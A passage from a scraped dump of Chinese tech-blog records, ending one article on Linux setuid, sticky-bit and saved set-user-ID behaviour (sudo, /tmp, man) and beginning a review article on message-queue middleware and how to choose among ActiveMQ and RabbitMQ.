class=\"crayon-v\">rwsr</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">xr</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">71288</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">2</span>月<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">28</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">2013</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sudo</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>如前所述，这个输出的含义是，对于 <code>/usr/bin/sudo</code> 文件，</p>\n<ul>\n<li>第1~3位的 <code>rws</code> 表示该文件可被它的owner（属主）以 <code>r</code> 或 <code>w</code> 或 <code>s</code> 的权限访问</li>\n<li>第4~6位的 <code>r-x</code> 表示该文件可被与该文件同一属组的用户以 <code>r</code> 或 <code>x</code> 的权限访问。</li>\n<li>第7~9位的 <code>r-x</code> 表示该文件可被其它未知用户以 <code>r</code> 或 <code>x</code> 的权限访问。</li>\n</ul>\n<p>这样设置之后，对于owner，具有读、写、执行权限，这一点没有什么不同。但是对于不属于 <code>root</code> 组的普通用户进程来说，却大不相同。</p>\n<p>普通用户进程执行 <code>sudo</code> 命令时通过其 <code>others</code> 中的 <code>x</code> 获得执行权限，再通过 <code>user</code> 中的 <code>s</code> 使得普通用户进程临时具有了 <code>sudo</code> 可执行文件属主( <code>root</code> )的权限，即超级权限。</p>\n<p>这也是为什么通过 <code>sudo</code> 命令就可以让普通用户执行许多管理员权限的命令的原因。</p>\n<h5>设置了 <code>stick-bit</code><a id=\"orgheadline18\"></a></h5>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a92874b3dc450075650\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ls -l / |grep tmp\r\ndrwxrwxrwt  25 root root 12288  7月 20 09:09 tmp</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a92874b3dc450075650-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92874b3dc450075650-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a92874b3dc450075650-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ls</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-e\">grep </span><span class=\"crayon-e\">tmp</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92874b3dc450075650-2\"><span class=\"crayon-i\">drwxrwxrwt</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">25</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12288</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">7</span>月<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">09</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">09</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tmp</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>这样设置之后，对于 <code>/tmp</code> 目录，任何人都具有读、写、执行权限，这一点没有什么不同。但是对于 <code>others</code> 部分设置了粘滞位 <code>t</code>, 其功能却大不相同。</p>\n<p>若目录没设置粘滞位，任何对目录有写权限者都则可删除其中任何文件和子目录，即使他不是相应文件的所有者，也没有读或写许可; 设置粘滞位后，用户就只能写或删除属于他的文件和子目录。</p>\n<p>这也是为什么任何人都能向 <code>/tmp</code> 目录写文件、目录，却只能写和删除自己拥有的文件或目录的原因。</p>\n<h5>举一个 <code>man</code> 程序的应用片断，描述 <code>set-user-id</code> 和 <code>saved set-user-id</code> 的使用<a id=\"orgheadline19\"></a></h5>\n<p><code>man</code> 程序可以用来显示在线帮助手册， <code>man</code> 程序可以被安装指定 <code>set-user-ID</code> 或者 <code>set-group-ID</code> 为一个指定的用户或者组。</p>\n<p><code>man</code> 程序可以读取或者覆盖某些位置的文件，这一般由一个配置文件(通常是 <code>/etc/man.config</code> 或者 <code>/etc/manpath.config</code> )或者命令行选项来进行配置。</p>\n<p><code>man</code> 程序可能会执行一些其它的命令来处理包含显示的 <code>man</code> 手册页的文件。</p>\n<p>为防止处理出错， <code>man</code> 会从两个特权之间进行切换：运行 <code>man</code> 命令的用户特权，以及 <code>man</code> 程序的拥有者的特权。</p>\n<p>需要抓住的主线：当只执行 <code>man</code> 之时，进程特权就是 <code>man</code> 用户的特权， 当通过 <code>man</code> 执行子进程（如通过 <code>!bash</code> 引出shell命令）时，用户切换为当前用户，执行完又切换回去。</p>\n<p>过程如下：</p>\n<ol>\n<li>假设 <code>man</code> 程序文件被用户 <code>man</code> 所拥有，并且已经被设置了它的 <code>set-user-ID</code> 位，当我们 <code>exec</code> 它的时候，我们有如下情况：\n<ul>\n<li><code>real user ID</code> = 我们的用户UID</li>\n<li><code>effective user ID</code> = man用户UID</li>\n<li><code>saved set-user-ID</code> = man用户UID</li>\n</ul>\n</li>\n<li><code>man</code> 程序会访问需要的配置文件和 <code>man</code> 手册页。这些文件由 <code>man</code> 用户所拥有，但是由于 <code>effective user ID</code> 是 <code>man</code>,文件的访问就被允许了。</li>\n<li>在 <code>man</code> 为我们运行任何命令的时候，它会调用 <code>setuid(getuid()))</code> (<code>getuid()</code> 返回的是 <code>real user id</code>).因为我们不是 <code>superuser</code> 进程，这个变化只能改变 <code>effective user ID</code>. 我们会有如下情况：\n<ul>\n<li><code>real user ID</code> = 我们的用户UID(不会被改变)</li>\n<li><code>effective user ID</code> = 我们的用户UID</li>\n<li><code>saved set-user-ID</code> = man 的用户UID(不会被改变)</li>\n</ul>\n<p>现在 <code>man</code> 进程运行的时候把我们得UID作为它的 <code>effective user ID</code>.这也就是说，我们只能访问我们拥有自己权限的文件。也就是说，它能够代表我们安全地执行任何 <code>filter</code>.</p></li>\n<li>当 <code>filter</code> 做完了的时候， <code>man</code> 会调用 <code>setuid(euid)</code>.这里， <code>euid</code> 是 <code>man</code> 用户的UID.(这个ID是通过 <code>man</code> 调用 <code>geteuid</code> 来保存的)这个调用是可以的，因为 <code>setuid</code> 的参数和 <code>saved set-user-ID</code> 是相等的。(这也就是为什么我们需要 <code>saved set-user-ID</code>).这时候我们会有如下情况：\n<ul>\n<li><code>real user ID</code> = 我们的用户UID(不会被改变)</li>\n<li><code>effective user ID</code> = man的UID</li>\n<li><code>saved set-user-ID</code> = man 的用户UID(不会被改变)</li>\n</ul>\n</li>\n<li>由于 <code>effective user ID</code> 是 <code>man</code>,现在 <code>man</code> 程序可以操作它自己的文件了。通过这样使用 <code>saved set-user-ID</code>,我们可以在进程开始和结束的时候通过程序文件的 <code>set-user-ID</code> 来使用额外的权限。然而，期间我们却是以我们自己的权限运行的。如果我们无法在最后切换回 <code>saved set-user-ID</code>,我们就可能会在我们运行的时候保留额外的权限。</li>\n</ol>\n<p>下面我们来看看如果 <code>man</code> 启动一个 <code>shell</code> 的时候会发生什么：</p>\n<ul>\n<li>这里的 <code>shell</code> 是 <code>man</code> 使用 <code>fork</code> 和 <code>exec</code> 来启动的。</li>\n<li>因为这时 <code>real user ID</code> 和 <code>effective user ID</code> 都是我们的普通用户UID(参见step3)， 所以 <code>shell</code> 没有其它额外的权限.</li>\n<li>启动的 <code>shell</code> 无法访问 <code>man</code> 的 <code>saved set-user-ID(man)</code> ,因为 <code>shell</code> 的 <code>saved set-user-ID</code> 是由 <code>exec</code> 从 <code>effective user ID</code> 拷贝过来的。</li>\n<li>在执行 <code>exec</code> 的子进程( <code>shell</code> )中，所有的 <code>user ID</code> 都是我们的普通用户ID.</li>\n</ul>\n<p>实际上，我们描述 <code>man</code> 使用 <code>setuid</code> 函数的方法不是特别正确，因为程序可能会 <code>set-user-ID</code> 为 <code>root</code> .这时候， <code>setuid</code> 会把所有三种uid都变成你设置的id，但是我们只需要设置 <code>effective user ID</code>.</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114087\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114087votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114087\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Linux", "url": "http://blog.jobbole.com/114087/", "url_obj_id": "20d7b616b6fb5b1d5bcbf0b78222d68f"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2017/03/4bae6998d00f180d42c7da716e3d0bb2.jpg"], "title": "分布式之消息队列复习精讲", "create_date": "2018/05/21 ·", "praise_num": 2, "fav_num": 7, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/rjzheng/p/8994962.html\">孤独烟</a>   </div><h2 id=\"引言\">引言</h2>\n<h3 id=\"为什么写这篇文章\">为什么写这篇文章?</h3>\n<p>博主有两位朋友分别是小A和小B:</p>\n<ol>\n<li>小A，工作于传统软件行业(某社保局的软件外包公司)，每天工作内容就是和产品聊聊需求，改改业务逻辑。再不然就是和运营聊聊天，写几个SQL，生成下报表。又或者接到客服的通知，某某功能故障了，改改数据，然后下班部署上线。每天过的都是这种生活，技术零成长。</li>\n<li>小B，工作于某国企，虽然能接触到一些中间件技术。然而，他只会订阅/发布消息。通俗点说，就是调调API。对为什么使用这些中间件啊？如何保证高可用啊？没有充分的认识。</li>\n</ol>\n<p>庆幸的是两位朋友都很有上进心，于是博主写这篇文章，帮助他们复习一下关于消息队列中间件这块的要点</p>\n<h3 id=\"复习要点\">复习要点</h3>\n<p>本文大概围绕如下几点进行阐述:</p>\n<ol>\n<li>为什么使用消息队列？</li>\n<li>使用消息队列有什么缺点?</li>\n<li>消息队列如何选型?</li>\n<li>如何保证消息队列是高可用的？</li>\n<li>如何保证消息不被重复消费?</li>\n<li>如何保证消费的可靠性传输?</li>\n<li>如何保证消息的顺序性？</li>\n</ol>\n<p>我们围绕以上七点进行阐述。需要说明一下，本文不是《消息队列从入门到精通》这种课程，因此只是提供一个复习思路，而不是去教你们怎么调用消息队列的API。建议对消息队列不了解的人，去找点消息队列的博客看看，再看本文，收获更大</p>\n<h2 id=\"正文\">正文</h2>\n<h3 id=\"为什么要使用消息队列\">1、为什么要使用消息队列?</h3>\n<p><strong>分析</strong>:一个用消息队列的人，不知道为啥用，这就有点尴尬。没有复习这点，很容易被问蒙，然后就开始胡扯了。<br>\n<strong>回答</strong>:这个问题,咱只答三个最主要的应用场景(不可否认还有其他的，但是只答三个主要的),即以下六个字:<strong>解耦、异步、削峰</strong></p>\n<h4 id=\"解耦\">(1)解耦</h4>\n<p><strong>传统模式:</strong><br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/56e7aff9d63f0f4383fa069aa8c8bfb2.png\"><br>\n传统模式的缺点：</p>\n<ul>\n<li>系统间耦合性太强，如上图所示，系统A在代码中直接调用系统B和系统C的代码，如果将来D系统接入，系统A还需要修改代码，过于麻烦！</li>\n</ul>\n<p><strong>中间件模式:</strong><br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/58111d7a4fd8b531bfc034f708a16660.png\"><br>\n中间件模式的的优点：</p>\n<ul>\n<li>将消息写入消息队列，需要消息的系统自己从消息队列中订阅，从而系统A不需要做任何修改。</li>\n</ul>\n<h4 id=\"异步\">(2)异步</h4>\n<p><strong>传统模式:</strong><br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/f143f69236fa3ea412679f166b018249.png\"><br>\n传统模式的缺点：</p>\n<ul>\n<li>一些非必要的业务逻辑以同步的方式运行，太耗费时间。</li>\n</ul>\n<p><strong>中间件模式:</strong><br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/16ac587309c929e6b286d00eed9723f5.png\"><br>\n中间件模式的的优点：</p>\n<ul>\n<li>将消息写入消息队列，非必要的业务逻辑以异步的方式运行，加快响应速度</li>\n</ul>\n<h4 id=\"削峰\">(3)削峰</h4>\n<p><strong>传统模式</strong><br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/a25d591aad6af8be2af03281b0648dbe.png\"><br>\n传统模式的缺点：</p>\n<ul>\n<li>并发量大的时候，所有的请求直接怼到数据库，造成数据库连接异常</li>\n</ul>\n<p><strong>中间件模式:</strong><br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/1e39849ee5829567e914ccf126e058ae.png\"><br>\n中间件模式的的优点：</p>\n<ul>\n<li>系统A慢慢的按照数据库能处理的并发量，从消息队列中慢慢拉取消息。在生产中，这个短暂的高峰期积压是允许的。</li>\n</ul>\n<h3 id=\"使用了消息队列会有什么缺点\">2、使用了消息队列会有什么缺点?</h3>\n<p><strong>分析</strong>:一个使用了MQ的项目，如果连这个问题都没有考虑过，就把MQ引进去了，那就给自己的项目带来了风险。我们引入一个技术，要对这个技术的弊端有充分的认识，才能做好预防。<strong>要记住，不要给公司挖坑！</strong><br>\n<strong>回答</strong>:回答也很容易，从以下两个个角度来答</p>\n<ul>\n<li><strong>系统可用性降低</strong>:你想啊，本来其他系统只要运行好好的，那你的系统就是正常的。现在你非要加个消息队列进去，那消息队列挂了，你的系统不是呵呵了。因此，系统可用性降低</li>\n<li><strong>系统复杂性增加</strong>:要多考虑很多方面的问题，比如一致性问题、如何保证消息不被重复消费，如何保证保证消息可靠传输。因此，需要考虑的东西更多，系统复杂性增大。</li>\n</ul>\n<p>但是，我们该用还是要用的。</p>\n<h3 id=\"消息队列如何选型\">3、消息队列如何选型?</h3>\n<p>先说一下，博主只会ActiveMQ,RabbitMQ,RocketMQ,Kafka，对什么ZeroMQ等其他MQ没啥理解，因此只能基于这四种MQ给出回答。<br>\n<strong>分析</strong>:既然在项目中用了MQ，肯定事先要对业界流行的MQ进行调研，如果连每种MQ的优缺点都没了解清楚，就拍脑袋依据喜好，用了某种MQ，还是给项目挖坑。如果面试官问:”你为什么用这种MQ？。”你直接回答”领导决定的。”这种回答就很LOW了。<strong>还是那句话，不要给公司挖坑。</strong><br>\n<strong>回答</strong>:首先，咱先上<a href=\"http://activemq.apache.org/\">ActiveMQ的社区</a>，看看该MQ的更新频率:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a822d1bd7a866922955\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" touchscreen minimize scroll-mouseover\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nApache ActiveMQ 5.15.3 Release\r\nChristopher L. Shannon posted on Feb 12, 2018\r\nApache ActiveMQ 5.15.2 Released\r\nChristopher L. Shannon posted on Oct 23, 2017\r\nApache ActiveMQ 5.15.0 Released\r\nChristopher L. Shannon posted on Jul 06, 2017\r\n省略以下记录\r\n...</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a822d1bd7a866922955-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a822d1bd7a866922955-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a822d1bd7a866922955-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a822d1bd7a866922955-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a822d1bd7a866922955-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a822d1bd7a866922955-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4a822d1bd7a866922955-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a822d1bd7a866922955-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a822d1bd7a866922955-1\"><span class=\"crayon-e\">Apache </span><span class=\"crayon-i\">ActiveMQ</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5.15.3</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Release</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a822d1bd7a866922955-2\"><span class=\"crayon-i\">Christopher</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">L</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Shannon </span><span class=\"crayon-e\">posted </span><span class=\"crayon-e\">on </span><span class=\"crayon-i\">Feb</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span></div><div class=\"crayon-line\" id=\"crayon-5b4a822d1bd7a866922955-3\"><span class=\"crayon-e\">Apache </span><span class=\"crayon-i\">ActiveMQ</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5.15.2</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Released</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a822d1bd7a866922955-4\"><span class=\"crayon-i\">Christopher</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">L</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Shannon </span><span class=\"crayon-e\">posted </span><span class=\"crayon-e\">on </span><span class=\"crayon-i\">Oct</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">23</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2017</span></div><div class=\"crayon-line\" id=\"crayon-5b4a822d1bd7a866922955-5\"><span class=\"crayon-e\">Apache </span><span class=\"crayon-i\">ActiveMQ</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5.15.0</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Released</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a822d1bd7a866922955-6\"><span class=\"crayon-i\">Christopher</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">L</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Shannon </span><span class=\"crayon-e\">posted </span><span class=\"crayon-e\">on </span><span class=\"crayon-i\">Jul</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">06</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2017</span></div><div class=\"crayon-line\" id=\"crayon-5b4a822d1bd7a866922955-7\">省略以下记录</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a822d1bd7a866922955-8\"><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0017 seconds] -->\r\n<p>我们可以看出，ActiveMq几个月才发一次版本，据说研究重心在他们的下一代产品Apollo。<br>\n接下来，我们再去<a href=\"http://www.rabbitmq.com/\">RabbitMQ的社区</a>去看一下,RabbitMQ的更新频率</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a822d1bd83649830686\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" touchscreen minimize scroll-mouseover\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nRabbitMQ 3.7.3 release  30 January 2018\r\nRabbitMQ 3.6.15 release  17 January 2018\r\nRabbitMQ 3.7.2 release23 December 2017\r\nRabbitMQ 3.7.1 release21 December 2017\r\n省略以下记录\r\n...</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a822d1bd83649830686-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a822d1bd83649830686-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a822d1bd83649830686-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a822d1bd83649830686-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a822d1bd83649830686-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a822d1bd83649830686-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a822d1bd83649830686-1\"><span class=\"crayon-i\">RabbitMQ</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3.7.3</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">release</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">30</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">January</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a822d1bd83649830686-2\"><span class=\"crayon-i\">RabbitMQ</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3.6.15</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">release</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">17</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">January</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span></div><div class=\"crayon-line\" id=\"crayon-5b4a822d1bd83649830686-3\"><span class=\"crayon-i\">RabbitMQ</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3.7.2</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">release23 </span><span class=\"crayon-i\">December</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2017</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a822d1bd83649830686-4\"><span class=\"crayon-i\">RabbitMQ</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3.7.1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">release21 </span><span class=\"crayon-i\">December</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2017</span></div><div class=\"crayon-line\" 